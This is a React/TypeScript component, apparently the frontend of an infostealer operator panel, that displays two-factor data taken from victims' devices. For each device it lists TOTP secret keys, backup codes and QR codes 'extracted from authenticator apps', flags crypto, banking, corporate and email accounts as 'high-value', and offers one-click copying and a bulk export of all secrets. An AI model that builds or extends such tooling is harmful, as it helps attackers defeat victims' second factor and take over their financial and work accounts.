"use client"

import { useEffect, useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Button } from "@/components/ui/button"
import { Shield, Key, Download, AlertTriangle, Copy, CheckCircle, Smartphone } from "lucide-react"
import { toast } from "sonner"

interface AuthenticatorTableProps {
  deviceId: string
}

interface AuthenticatorData {
  id: number
  app_type: string
  service_name: string | null
  account_name: string | null
  secret_key: string | null
  backup_codes: string | null
  qr_code_path: string | null
  file_path: string | null
  created_at: string
  has_secret: boolean
  has_backup_codes: boolean
  has_qr_code: boolean
  backup_codes_count: number
  backup_codes_array: string[] | null
}

interface AuthenticatorResponse {
  success: boolean
  device_id: string
  device_name: string
  upload_date: string
  stats: {
    total_2fa_accounts: number
    with_secrets: number
    with_backup_codes: number
    with_qr_codes: number
    unique_services: number
    authy_accounts: number
    google_auth_accounts: number
    microsoft_auth_accounts: number
    browser_extension_accounts: number
    other_accounts: number
  }
  authenticators: {
    all: AuthenticatorData[]
    by_app_type: Record<string, AuthenticatorData[]>
    by_service: Record<string, AuthenticatorData[]>
    high_value: {
      all: AuthenticatorData[]
      by_category: Record<string, AuthenticatorData[]>
      count: number
    }
  }
}

export function AuthenticatorTable({ deviceId }: AuthenticatorTableProps) {
  const [data, setData] = useState<AuthenticatorResponse | null>(null)
  const [loading, setLoading] = useState(true)
  const [copiedId, setCopiedId] = useState<number | null>(null)

  useEffect(() => {
    fetchAuthenticators()
  }, [deviceId])

  const fetchAuthenticators = async () => {
    try {
      setLoading(true)
      const response = await fetch(`/api/v1/authenticator/${deviceId}`)
      const result = await response.json()

      if (result.success) {
        setData(result)
      } else {
        toast.error(result.error || "Failed to fetch authenticator data")
      }
    } catch (error) {
      console.error("Error fetching authenticator data:", error)
      toast.error("Failed to fetch authenticator data")
    } finally {
      setLoading(false)
    }
  }

  const copyToClipboard = (text: string, id: number, type: string) => {
    navigator.clipboard.writeText(text)
    setCopiedId(id)
    toast.success(`${type} copied to clipboard`)
    setTimeout(() => setCopiedId(null), 2000)
  }

  const exportSecrets = () => {
    if (!data || data.authenticators.all.length === 0) {
      toast.error("No authenticator data to export")
      return
    }

    const secretsWithBackups = data.authenticators.all
      .filter(auth => auth.has_secret)
      .map(auth => {
        let output = `Service: ${auth.service_name || 'Unknown'}\n`
        output += `Account: ${auth.account_name || 'N/A'}\n`
        output += `App Type: ${auth.app_type}\n`
        output += `Secret: ${auth.secret_key}\n`
        if (auth.backup_codes_array && auth.backup_codes_array.length > 0) {
          output += `Backup Codes:\n${auth.backup_codes_array.join('\n')}\n`
        }
        output += `\n${'='.repeat(60)}\n\n`
        return output
      })
      .join('')

    const blob = new Blob([secretsWithBackups], { type: 'text/plain' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `2fa-secrets-${deviceId}-${Date.now()}.txt`
    a.click()
    URL.revokeObjectURL(url)
    toast.success(`Exported ${data.stats.with_secrets} 2FA secret(s)`)
  }

  const getAppTypeBadge = (appType: string) => {
    const colors: Record<string, string> = {
      authy: "bg-red-600",
      google_authenticator: "bg-blue-600",
      microsoft_authenticator: "bg-cyan-600",
      browser_extension: "bg-purple-600",
      other: "bg-gray-600"
    }

    const labels: Record<string, string> = {
      authy: "Authy",
      google_authenticator: "Google Auth",
      microsoft_authenticator: "Microsoft Auth",
      browser_extension: "Browser Extension",
      other: "Other"
    }

    return (
      <Badge className={colors[appType] || "bg-gray-600"}>
        {labels[appType] || appType}
      </Badge>
    )
  }

  const getCategoryBadge = (category: string) => {
    const colors: Record<string, string> = {
      crypto: "bg-orange-600",
      banking: "bg-green-600",
      corporate: "bg-blue-600",
      email: "bg-purple-600"
    }

    return (
      <Badge className={colors[category] || "bg-gray-600"}>
        {category.toUpperCase()}
      </Badge>
    )
  }

  if (loading) {
    return <div className="text-center py-8">Loading authenticator data...</div>
  }

  if (!data) {
    return <div className="text-center py-8">No authenticator data available</div>
  }

  return (
    <div className="space-y-4">
      {/* High-Value Targets Alert */}
      {data.authenticators.high_value.count > 0 && (
        <Card className="border-orange-500/20 bg-orange-500/5">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-orange-500">
              <AlertTriangle className="h-5 w-5" />
              High-Value 2FA Accounts Detected
            </CardTitle>
            <CardDescription>
              {data.authenticators.high_value.count} 2FA accounts found for crypto, banking, corporate, and email services
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              {Object.entries(data.authenticators.high_value.by_category).map(([category, accounts]) => (
                <div key={category} className="text-center">
                  <div className="text-2xl font-bold">
                    {accounts.length}
                  </div>
                  <div className="text-sm">{getCategoryBadge(category)}</div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      )}

      {/* Stats Overview */}
      <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Total Accounts</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{data.stats.total_2fa_accounts}</div>
            <p className="text-xs text-muted-foreground">{data.stats.unique_services} services</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Secrets</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-500">{data.stats.with_secrets}</div>
            <p className="text-xs text-muted-foreground">TOTP secrets</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Backup Codes</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-blue-500">{data.stats.with_backup_codes}</div>
            <p className="text-xs text-muted-foreground">with backup codes</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">QR Codes</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-purple-500">{data.stats.with_qr_codes}</div>
            <p className="text-xs text-muted-foreground">QR code images</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">High-Value</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-orange-500">{data.authenticators.high_value.count}</div>
            <p className="text-xs text-muted-foreground">crypto/banking/corp</p>
          </CardContent>
        </Card>
      </div>

      {/* Main Table */}
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <div>
              <CardTitle className="flex items-center gap-2">
                <Shield className="h-5 w-5" />
                2FA/Authenticator Data
              </CardTitle>
              <CardDescription>
                TOTP secrets, backup codes, and QR codes extracted from authenticator apps
              </CardDescription>
            </div>
            <Button variant="outline" size="sm" onClick={exportSecrets}>
              <Download className="h-4 w-4 mr-2" />
              Export Secrets
            </Button>
          </div>
        </CardHeader>
        <CardContent>
          <ScrollArea className="h-[600px]">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Service</TableHead>
                  <TableHead>Account</TableHead>
                  <TableHead>App Type</TableHead>
                  <TableHead>Secret Key</TableHead>
                  <TableHead>Backup Codes</TableHead>
                  <TableHead>QR Code</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {data.authenticators.all.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={6} className="text-center py-8 text-muted-foreground">
                      No authenticator data found
                    </TableCell>
                  </TableRow>
                ) : (
                  data.authenticators.all.map((auth) => (
                    <TableRow key={auth.id}>
                      <TableCell className="font-medium">
                        <div className="flex items-center gap-2">
                          <Smartphone className="h-4 w-4 text-muted-foreground" />
                          {auth.service_name || 'Unknown Service'}
                        </div>
                      </TableCell>
                      <TableCell>{auth.account_name || 'N/A'}</TableCell>
                      <TableCell>{getAppTypeBadge(auth.app_type)}</TableCell>
                      <TableCell>
                        {auth.has_secret ? (
                          <div className="flex items-center gap-2">
                            <code className="font-mono text-xs bg-muted px-2 py-1 rounded max-w-xs truncate">
                              {auth.secret_key}
                            </code>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => copyToClipboard(auth.secret_key!, auth.id, 'Secret')}
                            >
                              {copiedId === auth.id ? (
                                <CheckCircle className="h-4 w-4 text-green-500" />
                              ) : (
                                <Copy className="h-4 w-4" />
                              )}
                            </Button>
                          </div>
                        ) : (
                          <Badge variant="outline">None</Badge>
                        )}
                      </TableCell>
                      <TableCell>
                        {auth.has_backup_codes ? (
                          <div className="flex flex-col gap-1">
                            <Badge variant="secondary" className="w-fit">
                              {auth.backup_codes_count} codes
                            </Badge>
                            {auth.backup_codes_array && auth.backup_codes_array.length > 0 && (
                              <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => copyToClipboard(auth.backup_codes_array!.join('\n'), auth.id, 'Backup codes')}
                              >
                                <Copy className="h-4 w-4 mr-1" />
                                Copy All
                              </Button>
                            )}
                          </div>
                        ) : (
                          <Badge variant="outline">None</Badge>
                        )}
                      </TableCell>
                      <TableCell>
                        {auth.has_qr_code ? (
                          <Badge variant="secondary" className="flex items-center gap-1 w-fit">
                            <CheckCircle className="h-3 w-3" />
                            Available
                          </Badge>
                        ) : (
                          <Badge variant="outline">None</Badge>
                        )}
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </ScrollArea>
        </CardContent>
      </Card>

      {/* App Type Breakdown */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <Card>
          <CardHeader>
            <CardTitle>Breakdown by App Type</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-2">
              {Object.entries(data.authenticators.by_app_type).map(([appType, accounts]) => (
                <div key={appType} className="flex items-center justify-between">
                  <div>{getAppTypeBadge(appType)}</div>
                  <Badge variant="outline">{accounts.length}</Badge>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Top Services</CardTitle>
          </CardHeader>
          <CardContent>
            <ScrollArea className="h-[200px]">
              <div className="space-y-2">
                {Object.entries(data.authenticators.by_service)
                  .sort(([, a], [, b]) => b.length - a.length)
                  .slice(0, 10)
                  .map(([service, accounts]) => (
                    <div key={service} className="flex items-center justify-between">
                      <span className="font-medium truncate">{service}</span>
                      <Badge variant="outline">{accounts.length}</Badge>
                    </div>
                  ))}
              </div>
            </ScrollArea>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
